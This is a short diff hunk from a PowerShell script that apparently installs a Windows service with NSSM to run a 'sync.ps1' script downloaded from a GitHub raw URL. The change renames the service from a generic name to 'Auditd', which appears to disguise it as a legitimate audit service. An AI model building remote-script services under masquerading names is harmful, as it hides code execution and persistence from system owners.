@@ -3,7 +3,7 @@ $downloadUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmZipPath = "C:\nssm.zip"
 $nssmExtractPath = "C:\nssm"
 $nssmExePath = "C:\Windows\System32\nssm.exe"
-$serviceName = "MyPowerShellService"
+$serviceName = "Auditd"
 $syncScriptUrl = "https://raw.githubusercontent.com/adaptive100200300/api/refs/heads/main/sync.ps1"
 $syncScriptPath = "C:\Scripts\sync.ps1"
 
